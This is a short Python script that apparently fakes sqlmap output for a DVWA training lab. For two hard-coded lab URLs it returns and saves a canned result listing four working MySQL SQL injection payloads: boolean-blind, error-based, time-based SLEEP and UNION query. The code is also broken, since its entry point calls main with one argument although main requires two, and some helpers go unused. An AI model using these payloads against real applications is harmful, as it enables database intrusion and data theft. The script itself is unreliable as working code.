import sys
import os
import json
# 输入示例列表
def create_file(file_path,msg):
    f=open(file_path,"a")
    f.write(msg)
    f.close()


def main(infile, n):
    instring = ["http://10.10.10.12/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#", "http://10.10.10.12/dvwa/"]
    # 输入

    # 输出实例
    outfile = [
        {'place': 'GET', 'parameter': 'id', 'ptype': 2, 'prefix': "'", 'suffix': '[GENERIC_SQL_COMMENT]', 'clause': [1],
         'notes': [], 'data': {1: {'title': 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)',
                                   'payload': "id=1' OR NOT 8895=8895#&Submit=Submit", 'where': 1,
                                   'vector': 'OR NOT [INFERENCE]', 'comment': '#', 'templatePayload': None,
                                   'matchRatio': 0.976, 'trueCode': 200, 'falseCode': 200},
                               2: {'title': 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)',
            'payload': "id=1' AND ROW(9320,5386)>(SELECT COUNT(*),CONCAT(0x717a7a7171,(SELECT (ELT(9320=9320,1))),0x7170707171,FLOOR(RAND(0)*2))x FROM (SELECT 4784 UNION SELECT 8004 UNION SELECT 3468 UNION SELECT 5415)a GROUP BY x)-- Gxsi&Submit=Submit",
            'where': 1,
            'vector': "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)",
            'comment': '', 'templatePayload': None, 'matchRatio': 0.976, 'trueCode': None, 'falseCode': None},
                               3: {'title': 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)',
                                   'payload': "id=1' AND (SELECT 8519 FROM (SELECT(SLEEP([SLEEPTIME])))orcc)-- EOKK&Submit=Submit",
                                   'where': 1,
                                   'vector': 'AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])',
                                   'comment': '', 'templatePayload': None, 'matchRatio': 0.976, 'trueCode': 200,
                                   'falseCode': None},
                               4: {'title': 'MySQL UNION query (NULL) - 1 to 20 columns',
                                                           'payload': "id=1' UNION ALL SELECT NULL,CONCAT(0x717a7a7171,0x736375644169426e4962456f735978416244697844566f576364655764454d544f4369764c6f4544,0x7170707171)#&Submit=Submit",
                                                           'where': 1, 'vector': (
                1, 2, '#', "'", '[GENERIC_SQL_COMMENT]', 'NULL', 1, False, None, None, None), 'comment': '#',
                                                           'templatePayload': None, 'matchRatio': 0.976,
                                                           'trueCode': None, 'falseCode': None}},
         'conf': {'textOnly': None, 'titles': None, 'code': None, 'string': None, 'notString': 'Me', 'regexp': None,
                  'optimize': None}, 'dbms': 'MySQL', 'dbms_version': ['>= 4.1'], 'os': None}]
    # 输出格式化
    outfile2 = """---
    Parameter: id (GET)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
        Payload: id=1' OR NOT 8895=8895#&Submit=Submit

        Type: error-based
        Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: id=1' AND ROW(9320,5386)>(SELECT COUNT(*),CONCAT(0x717a7a7171,(SELECT (ELT(9320=9320,1))),0x7170707171,FLOOR(RAND(0)*2))x FROM (SELECT 4784 UNION SELECT 8004 UNION SELECT 3468 UNION SELECT 5415)a GROUP BY x)-- Gxsi&Submit=Submit

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: id=1' AND (SELECT 8519 FROM (SELECT(SLEEP(5)))orcc)-- EOKK&Submit=Submit

        Type: UNION query
        Title: MySQL UNION query (NULL) - 2 columns
        Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x717a7a7171,0x736375644169426e4962456f735978416244697844566f576364655764454d544f4369764c6f4544,0x7170707171)#&Submit=Submit
    ---"""

    if infile in instring:
        filename = "D:\\test\\" + str(n) + ".json"
        out = json.dumps(outfile, sort_keys=True, indent=4)
        out = out.encode('utf-8')
        with open(r"D:\\test\\" + str(n) + ".json", "wb") as f:
            f.write(out)
        return outfile

    else:
        print('none')


if __name__ == '__main__':
    if (len(sys.argv) > 1):
        infile = sys.argv[1]
        print('url:', sys.argv[1])
    else:
        infile = input('url(like "http://10.10.10.12/dvwa/"):')
    main(infile)


